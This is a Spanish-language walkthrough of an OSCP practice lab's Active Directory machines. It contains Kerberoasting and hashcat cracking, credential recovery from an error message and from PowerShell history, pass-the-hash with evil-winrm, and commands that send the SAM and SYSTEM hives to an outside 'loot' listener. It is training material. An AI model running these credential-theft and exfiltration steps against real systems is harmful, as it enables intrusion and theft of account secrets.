# Challenge: OSCP-C

## Fecha: 26/08/2025
## Objetivo

This is the third of three dedicated OSCP Challenge Labs. It is composed of six OSCP+ machines. The intention of this Challenge is to provide a mock-exam 
experience that closely reflects a similar level of difficulty to that of the actual OSCP+ exam.

The challenge contains three machines that are connected via Active Directory, and another three standalone machines that do not have any dependencies 
or intranet connections. All of the standalone machines have a local.txt and a proof.txt flag, however the Active Directory set only has a proof.txt on the Domain Controller. 
While the Challenge Labs have no point values, on the exam the standalone machines would be worth 20 points each for a total of 60 points. The Active Directory set is worth 40 points all together.

To align with the OSCP+ 'Assumed Breach' scenario for the Active Directory portion of the exam, please use the credentials below for initial access: 

**Username: Eric.Wallows **
**Password: EricLikesRunning800**

All the intended attack vectors for these machines are taught in the PEN-200 Modules, or are leveraged in the PEN-200 Challenge Labs 1-3. 
However, the specific requirements to trigger the vulnerabilities may differ from the exact scenarios and techniques demonstrated in the course material. 
You are expected to be able to take the demonstrated exploitation techniques and modify them for the current environment.

Please feel free to complete this challenge at your own pace. While the OSCP+ exam lasts for 23:45 hours, 
it is designed so that the machines can be successfully attacked in much less time. While each student is different, we highly recommend that you plan 
to spend a significant amount of time resting, eating, hydrating, and sleeping during your exam. 
Thus, we explicitly do not recommend that you attempt to work on this Challenge Lab for 24 hours straight.

We recommend that you begin with a network scan on all the provided IP addresses, and then enumerate each machine based on the results. 
When you are finished with the Challenge, we suggest that you create a mock-exam report for your own records, 
according to the advice provided in the Report Writing for Penetration Testers Module.

Good luck!

## Herramientas
1. Impacket- 
2. tool - 2



## AD-Machines

* nmap sobre **MS02**

```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/6_OSCP-C/AD-Machines]
└─# nmap -A 10.10.153.154 -oN MS02-result.txt  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-26 18:50 -03
Nmap scan report for 10.10.153.154
Host is up (0.13s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.10.153.154:1433: 
|     Target_Name: OSCP
|     NetBIOS_Domain_Name: OSCP
|     NetBIOS_Computer_Name: MS02
|     DNS_Domain_Name: oscp.exam
|     DNS_Computer_Name: MS02.oscp.exam
|     DNS_Tree_Name: oscp.exam
|_    Product_Version: 10.0.19041
| ms-sql-info: 
|   10.10.153.154:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false                                                                                                                                                                            
|_    TCP port: 1433                                                                                                                                                                                              
|_ssl-date: 2025-08-26T21:52:11+00:00; 0s from scanner time.                                                                                                                                                      
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback                                                                                                                                                          
| Not valid before: 2025-02-12T22:03:53                                                                                                                                                                           
|_Not valid after:  2055-02-12T22:03:53                                                                                                                                                                           
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                                                                              
|_http-title: Not Found                                                                                                                                                                                           
|_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                                                                                       
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                                                                             
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete                                                                                                                                 
No OS matches for host                                                                                                                                                                                            
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows                                                                                                                                                          
                                                                                                                                                                                                                  
Host script results:                                                                                                                                                                                              
| smb2-security-mode:                                                                                                                                                                                             
|   3:1:1:                                                                                                                                                                                                        
|_    Message signing enabled but not required                                                                                                                                                                    
| smb2-time:                                                                                                                                                                                                      
|   date: 2025-08-26T21:51:31                                                                                                                                                                                     
|_  start_date: N/A                                                                                                                                                                                               
|_nbstat: NetBIOS name: MS02, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:86:b4:ec (VMware)                                                                                                                    
                                                                                                                                                                                                                  
TRACEROUTE                                                                                                                                                                                                        
HOP RTT       ADDRESS                                                                                                                                                                                             
1   132.20 ms 10.10.153.154                                                                                                                                                                                       

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.57 seconds
```



* Kerberosting sobre el **DC01** una vez establecido el tunnel ligolo

```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/6_OSCP-C/AD-Machines]
└─# impacket-GetUserSPNs -request -dc-ip 10.10.153.152 oscp.exam/Eric.Wallows
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName  Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------  --------  --------------------------  --------------------------  ----------
MSSQL/MS02.oscp.exam  sql_svc            2022-12-05 07:30:05.841260  2022-11-10 08:15:51.783016             
HTTP/MS01.oscp.exam   web_svc            2022-11-11 04:11:19.795439  2022-11-14 11:29:47.826775             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*sql_svc$OSCP.EXAM$oscp.exam/sql_svc*$a0dd4a60732a09acedf5bfcf507574e5$e8af2f257bab35a9be802ebe463657c242de0dc0b90c3be39190ab6d1e958207ecf27432ffaf6602153114eed63738ff8afc76445dbd657c5b5c7475e79d73e68fd638b0b616cb03353c1ace8a105c8d69ae250450d67f235c3bf041237f9c5e862d07c422fc5098b9549a790302900db048edb705d75575e6a260e0f7cba0582d2c5cdaebacedf1d0cb6cb23967e64f58304353efd8e53b5d8699995156519951e83b03ff865c361d020363c4ffc7f63267cd26714b992d857db4986b905503e8e55642d6220e6bca10553c3bcdc5d5623c59ad8143c4b8d1fc8ad9b728869bbfe7c34727f308d27bd003b1b44a08ae1ad0be15b6a6578fc0a14167be61830efbd1a1f5963e3bcd72a84e74df30e1d3c22721fe1f9447a7b8059b84982c523d729bc15d0efce53d760811d3713aec00229cfe3eaea363ee928c4797f1378cb6a2084f135734bf6ed9775cdc1347a0607503bf2fe23f245a9a8cfe2a90441654b9f5cb0e80384bf265599eec8c831e7843b6f03b4cfa466114a44301bafe85f6de0b26146f34a022b0cf7de235ec06e552116978c1663560ea5d62f5571c84a19f7471e4e31a738c96e016634625f5698ff66d89c3b88d658729f5f726eb0223cd2a5ac375769496c69b561868c9d44a103e5e9a3255cc946ba5da1ee7ec533c9659b59928fa7f57361c63f2187c15cbaaaec2fdef3506e170ee90bd7f1665050a8bde94be8da5ee916454b4839c0c61cfe4ec0b82aa73ad5a65e58803ba02eac3ec6d4d0d13f3be28007315e106a627ebbd9f7c1e9422ba5fe87a3147be3237c47188d6aee550cce930f8982dc24c4940b41b58f88bb9905894bd62e0f8497976816749e8de55d30ff76e82ce4eecddec9b10132ca66a363805144598c6539482ba896f58599952c14af06fa47039a559fc7555cb888037287c509d7224fd697b78213c0a06a5b05c50ee79193d1409b1f16ad5a11389862ede1c0bd9484a1929a65197aa975341a782a4c947f83e15b031a7e71760879c84d47187de46d380f215edaeef2d10c7aac88e64feb23dd708444a256d4ffd699782d6596f41afd6f499e4c4c23e704cf154598a18520ff8ada33a9d924b4193cda87db1930af70b6bd1574c672adf63b0725a84d9772d3854d31b6f491876e6aa7f7611c9bcc3304c2da4dfa4f661990df764c5be8aa08f87f992229f243c4d7e858630bb141911186b42a33669995b023a1f1eaa9531688c3295ba610ea431b7558ff03f474415d9d35057707d1be86fff8842a8c27ad6e2c131c78ec8b75b20c1559e500a2fba3cfea80dfac268b2102d857ec861db041fcf14cb733f7a55c737cc116cab723bd5e6b916e9b9889b08cde8037f09de9172119fc9c8ce22260d2aa67cd7fe0719e9116c1ab422f35f239e4e2e32a8c4691c8994b2fab6a2a59bee8fdb66bc017dc34e2baad3d9a8ada5d4301cbf00d051fd1ef65b3f0f
$krb5tgs$23$*web_svc$OSCP.EXAM$oscp.exam/web_svc*$930b6763905b875e87dcfcac1ad43f34$65041f670a17252911f190094c3588b5c5f2f61e056b7a21c38f6b26ccf50a49966547a46f751ecd4c8297b015a3a23edcdedee254b0b78f9cda8526d61f8aac1b6ea139d523d396b3f1a556485d163fb445177913358ffce26c1b147a2b6dd32fd6c58984468a6d4a1faa6b5c14cd45bdc54705b5774e72e4e99fa00107f2072a72724d62703409948119e0e4fdfb9cbfe52c94728a5bfeba7c9c1c716938dce5769003dc970f2993bda6beb8dcc18c06e2c157b31fd56762e89c6c7bc532034bb057b1988a8213d7a4b444a31d253810cd724be104a9737733910eaec4a68430e8319cc36586c89ceb3fb6eab0add161419606397829797279788320db2ce5c8a2cfb58e6dce4b50e56993ec7be2426300ad8ee3b1e54d23a2c95e068001f9c06e65a4497116eef2e15bc58270660014a77235d4f3c047e0898ec18c6e822fb9fda1c724ff625f9e1b021cb03e74df3564b48a4402e2e06dc70cec0795826bc3a847b5ced9462fcafd6f405f30f924750b534bfb70bf4995804d3b96215079fca1dbd78b689d6292be597ddaf1ba2bf2c28606eac8fa2ba344c77f5938f1b2a7b1f74d36fbc06c763ee0a39ec651c7fba540dd392c2f265d1d1e0ca1fb7f1746bcbb5b999e9b154f681e4e1d6ed9c98152be9bf352977783e87d7a643b08a8f1b2a37d68c92ce3cc3de3c857cebafa1f6347ce44fc7ff2e54d5cd1c244ef98f11646f808ef12926a9807273fb5c19584d3853de1a9e6e72b1dac283eef547db03cde59349a3a1d95ed841652f1b83daa32e611e6b68e9879adef4b32d11e6c56cb304fc3749d3937507fc49b356616e44f6fc9c50ddb02b68bd886a948a8d5ca7d5d458321a7cd03f61c3156610a9eead127d579cd5bfa92f5e72328e5269f0ce762a650eb62cded5e6daf12dd84d7233d9b52044faae102f987d5357adee3012755bf583c094257a1c806ded91403cd25e0ef246d7ac016bda60d6f4ba1939978117a8642317860021b2020d70c64fe85fdec61db2f4967e506ebf23eb0ea079b3d815b4cbb2fb8f7894e663483c0cd510f6ebf07519702025c963334905a043e8731389ab9b0f8070ab5c4728f0ed23f7a396879ea128767856a7386f92566bd0df0f4777633bd7a1a7af3a3f15af82c1a620a120ec373af4bfa1f4b02b26d7e22339d88929a7cc7d0b4489f0ec28518a74c3d6e11da1dadeb8783369214db6ec2ccbde05f7325155cf216ee027e6155c38eedc32f52a042dddd7ca9663b6b3143d22a26dbda9b803b7d73409f563f00d4d238b7265f705fff06021e23342c7f1be2bc6891e95353954a7f7f14c881d8a26b08163d0beef65fbc3dfc0cecd423e6031e14c3563d545fcc9185972219022fcd76410261e7dc46d7332c4c0d5c9a31aea957738b4a93cb1787f09cd180e4dbd64892dde0d5fd89f0737949fa1a03e12a705a485990ab83285f7cd0eac866500bbec3

```

* Guardamos los hashes en **hashes.kerberoast** y crakeamos

```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/6_OSCP-C/AD-Machines]
└─# hashcat -h | grep -i "kerberos"                                                   
  19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
  19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
  28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
  19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
  19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
  28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
  18200 | Kerberos 5, etype 23, AS-REP  

┌──(root㉿kali)-[/home/…/OffSec/Challenges/6_OSCP-C/AD-Machines]
└─# hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
hashcat (v6.2.6) starting

...

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 1104517645

$krb5tgs$23$*web_svc$OSCP.EXAM$oscp.exam/web_svc*$930b6763905b875e87dcfcac1ad43f34$65041f670a17252911f190094c3588b5c5f2f61e056b7a21c38f6b26ccf50a49966547a46f751ecd4c8297b015a3a23edcdedee254b0b78f9cda8526d61f8aac1b6ea139d523d396b3f1a556485d163fb445177913358ffce26c1b147a2b6dd32fd6c58984468a6d4a1faa6b5c14cd45bdc54705b5774e72e4e99fa00107f2072a72724d62703409948119e0e4fdfb9cbfe52c94728a5bfeba7c9c1c716938dce5769003dc970f2993bda6beb8dcc18c06e2c157b31fd56762e89c6c7bc532034bb057b1988a8213d7a4b444a31d253810cd724be104a9737733910eaec4a68430e8319cc36586c89ceb3fb6eab0add161419606397829797279788320db2ce5c8a2cfb58e6dce4b50e56993ec7be2426300ad8ee3b1e54d23a2c95e068001f9c06e65a4497116eef2e15bc58270660014a77235d4f3c047e0898ec18c6e822fb9fda1c724ff625f9e1b021cb03e74df3564b48a4402e2e06dc70cec0795826bc3a847b5ced9462fcafd6f405f30f924750b534bfb70bf4995804d3b96215079fca1dbd78b689d6292be597ddaf1ba2bf2c28606eac8fa2ba344c77f5938f1b2a7b1f74d36fbc06c763ee0a39ec651c7fba540dd392c2f265d1d1e0ca1fb7f1746bcbb5b999e9b154f681e4e1d6ed9c98152be9bf352977783e87d7a643b08a8f1b2a37d68c92ce3cc3de3c857cebafa1f6347ce44fc7ff2e54d5cd1c244ef98f11646f808ef12926a9807273fb5c19584d3853de1a9e6e72b1dac283eef547db03cde59349a3a1d95ed841652f1b83daa32e611e6b68e9879adef4b32d11e6c56cb304fc3749d3937507fc49b356616e44f6fc9c50ddb02b68bd886a948a8d5ca7d5d458321a7cd03f61c3156610a9eead127d579cd5bfa92f5e72328e5269f0ce762a650eb62cded5e6daf12dd84d7233d9b52044faae102f987d5357adee3012755bf583c094257a1c806ded91403cd25e0ef246d7ac016bda60d6f4ba1939978117a8642317860021b2020d70c64fe85fdec61db2f4967e506ebf23eb0ea079b3d815b4cbb2fb8f7894e663483c0cd510f6ebf07519702025c963334905a043e8731389ab9b0f8070ab5c4728f0ed23f7a396879ea128767856a7386f92566bd0df0f4777633bd7a1a7af3a3f15af82c1a620a120ec373af4bfa1f4b02b26d7e22339d88929a7cc7d0b4489f0ec28518a74c3d6e11da1dadeb8783369214db6ec2ccbde05f7325155cf216ee027e6155c38eedc32f52a042dddd7ca9663b6b3143d22a26dbda9b803b7d73409f563f00d4d238b7265f705fff06021e23342c7f1be2bc6891e95353954a7f7f14c881d8a26b08163d0beef65fbc3dfc0cecd423e6031e14c3563d545fcc9185972219022fcd76410261e7dc46d7332c4c0d5c9a31aea957738b4a93cb1787f09cd180e4dbd64892dde0d5fd89f0737949fa1a03e12a705a485990ab83285f7cd0eac866500bbec3:Diamond1
Cracking performance lower than expected?                 

...                                                                                                 

```

* Password **web_svc**: **Daimond1**

> Por ahora nada util surge de estas credenciales continuamos con la enumeracion en **MS01**

* Encontramos un archivo

```powershell
PS C:\Users\eric.wallows> dir                                                                                                                                                                                     
dir                                                                                                                                                                                                               
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
    Directory: C:\Users\eric.wallows                                                                                                                                                                              
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
Mode                 LastWriteTime         Length Name                                                                                                                                                            
----                 -------------         ------ ----                                                                                                                                                            
d-r---         12/7/2019   1:14 AM                Desktop                                                                                                                                                         
d-r---         8/26/2025   2:47 PM                Documents                                                                                                                                                       
d-r---         12/7/2019   1:14 AM                Downloads                                                                                                                                                       
d-r---         12/7/2019   1:14 AM                Favorites                                                                                                                                                       
d-r---         12/7/2019   1:14 AM                Links                                                                                                                                                           
d-r---         12/7/2019   1:14 AM                Music                                                                                                                                                           
d-r---         12/7/2019   1:14 AM                Pictures                                                                                                                                                        
d-----         12/7/2019   1:14 AM                Saved Games                                                                                                                                                     
d-r---         12/7/2019   1:14 AM                Videos                                                                                                                                                          
-a----        11/21/2022   4:49 AM        6102702 admintool.exe                                                                                                                                                   
                                                                                                                                                                                                                  
                                                                                                                                                                                                                  
PS C:\Users\eric.wallows>
```

* Intentamos ejecutarlo

```powershell
PS C:\Users\eric.wallows> .\admintool --help                                                                                                                                                                      
.\admintool --help                                                                                                                                                                                                
admintool 

USAGE:
    admintool.exe <CMD>

ARGS:
    <CMD>    

OPTIONS:
    -h, --help    Print help information
PS C:\Users\eric.wallows> 
```

* Introducimos un comando simple para ver el funcionamiento

```powershell
PS C:\Users\eric.wallows> .\admintool whoami
.\admintool whoami
Enter administrator password:

thread 'main' panicked at 'assertion failed: `(left == right)`
  left: `"d41d8cd98f00b204e9800998ecf8427e"`,
 right: `"05f8ba9f047f799adbea95a16de2ef5d"`: Wrong administrator password!', src/main.rs:78:5
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
PS C:\Users\eric.wallows> 
```

* Como no tenemos las credenciales de **administrator** retorna este mensaje en donde nos dice basicamente que espera **right:05f8ba9f047f799adbea95a16de2ef5d**

> Pasamos por un crackstation el hash y obtenemos las credenciaels **05f8ba9f047f799adbea95a16de2ef5d : December31**

Podemos conectarnos con ssh o evil-winrm con las credenciales de administrator

```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/6_OSCP-C/AD-Machines]
└─# ssh administrator@192.168.193.153                           
administrator@192.168.193.153's password: December31

Microsoft Windows [Version 10.0.19044.2251]
(c) Microsoft Corporation. All rights reserved.
                                               
administrator@MS01 C:\Users\Administrator>cd ..

administrator@MS01 C:\Users\eric.wallows\Documents>

```

* Elevamos a powershell y obtenemos el historial

```powershell
PS C:\Users\eric.wallows\Documents> (Get-PSReadlineOption).HistorySavePath
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
PS C:\Users\eric.wallows\Documents> type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
C:\users\support\admintool.exe hghgib6vHT3bVWf cmd
C:\users\support\admintool.exe cmd
shutdown /r /t 7
```
Parece ser otra credencial: **hghgib6vHT3bVWf**

> A pesar de propagar las credenciales con nxc obtenemos falsos negativos porque al intentar manualmente

```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/6_OSCP-C/AD-Machines]
└─# evil-winrm -i 10.10.153.154 -u 'administrator' -p 'hghgib6vHT3bVWf' -P 5985  
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
ms02\administrator
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```
> Entramos en **MS02**. Objetivo obtener credenciales de sql_svc y tom_admin

```powershell
*Evil-WinRM* PS C:\> dir


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         12/7/2019   1:14 AM                PerfLogs
d-r---        12/20/2022   5:30 AM                Program Files
d-r---        11/10/2022   2:52 AM                Program Files (x86)
d-r---        11/14/2022   6:32 AM                Users
d-----        12/20/2022   5:31 AM                Windows
d-----          4/4/2022   6:00 AM                windows.old
-a----         8/26/2025  10:38 AM           2693 output.txt


*Evil-WinRM* PS C:\>
```

* Obtenemos SYSTEM y SAM como en las maquinas anteriores

1. Configuramos dos listeners para subir nuestros scripts y descargar archivos desde 10.10.xxx.153

```bash
listener_add --addr 10.10.153.153:9001 --to 192.168.45.152:9001 --tcp
listener_add --addr 10.10.153.153:4446 --to 192.168.45.152:4446 --tcp
```


2. Ejecutamos 
```powershell
*Evil-WinRM* PS C:\Users\Administrator\Documents> iwr -uri http://10.10.153.153:9001/tools.zip -Outfile tools.zip 
*Evil-WinRM* PS C:\Users\Administrator\Documents> Expand-Archive tools.zip -DestinationPath .
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir


    Directory: C:\Users\Administrator\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        11/10/2022   2:54 AM                Visual Studio 2017
-a----         8/15/2025   4:48 PM        6694400 agent.exe
-a----         8/16/2025   7:40 PM           2302 Executor.ps1
-a----         5/19/2025  11:07 PM          39496 Invoke-SessionGopher.ps1
-a----         8/19/2025   9:51 AM        7996928 kerbrute_windows_amd64.exe
-a----         8/16/2025   8:07 PM       10136093 LaZagne.exe
-a----         5/19/2025  11:04 PM        1355264 mimikatz.exe
-a----         5/19/2025  11:57 PM          59392 nc.exe
-a----         8/17/2025  12:31 AM         600580 PowerUp.ps1
-a----         5/19/2025  11:03 PM         770279 PowerView.ps1
-a----         5/20/2025   9:16 AM          27136 PrintSpoofer64.exe
-a----         8/18/2025   4:18 PM         446976 Rubeus.exe
-a----          7/4/2025   3:15 PM           1218 Send-FileToLootSerer.ps1
-a----          7/4/2025   1:21 PM        1580041 SharpHound.ps1
-a----         8/17/2025   9:09 PM         158720 SpoolSample.exe
-a----         8/26/2025   8:28 PM       25966101 tools.zip
-a----         8/16/2025  11:02 AM       10144256 winPEASx64.exe


*Evil-WinRM* PS C:\Users\Administrator\Documents> .\Send-FileToLootSerer.ps1 -FilePath "C:\windows.old\Windows\System32\SAM" -URL "http://10.10.153.153:4446"


StatusCode        : 200
StatusDescription : OK
Content           : {70, 105, 108, 101...}
RawContent        : HTTP/1.0 200 OK
                    Date: Wed, 27 Aug 2025 03:33:06 GMT
                    Server: BaseHTTP/0.6 Python/3.13.5

                    File received.
Headers           : {[Date, Wed, 27 Aug 2025 03:33:06 GMT], [Server, BaseHTTP/0.6 Python/3.13.5]}
RawContentLength  : 14

Archivo enviado exitosamente: SAM


*Evil-WinRM* PS C:\Users\Administrator\Documents> .\Send-FileToLootSerer.ps1 -FilePath "C:\windows.old\Windows\System32\SYSTEM" -URL "http://10.10.153.153:4446"


StatusCode        : 200
StatusDescription : OK
Content           : {70, 105, 108, 101...}
RawContent        : HTTP/1.0 200 OK
                    Date: Wed, 27 Aug 2025 03:33:48 GMT
                    Server: BaseHTTP/0.6 Python/3.13.5

                    File received.
Headers           : {[Date, Wed, 27 Aug 2025 03:33:48 GMT], [Server, BaseHTTP/0.6 Python/3.13.5]}
RawContentLength  : 14

Archivo enviado exitosamente: SYSTEM


*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

* Obtenemos el flag:

```bash
┌──(root㉿kali)-[/home/…/OffSec/Challenges/6_OSCP-C/AD-Machines]
└─# impacket-secretsdump -sam SAM -system SYSTEM LOCAL                       
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x8bca2f7ad576c856d79b7111806b533d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
[*] Cleaning up... 
                                                                                                                                                                                                                  
┌──(root㉿kali)-[/home/…/OffSec/Challenges/6_OSCP-C/AD-Machines]
└─# evil-winrm -i 10.10.153.152 -u 'tom_admin' -H 4979d69d4ca66955c075c41cf45f24dc -P 5985
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\tom_admin\Documents> Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/26/2025  10:37 AM             34 proof.txt


*Evil-WinRM* PS C:\Users\tom_admin> type C:\Users\Administrator\Desktop\proof.txt
952278b109edec1ff2bdf42c6b6946fb
*Evil-WinRM* PS C:\Users\tom_admin> 
```
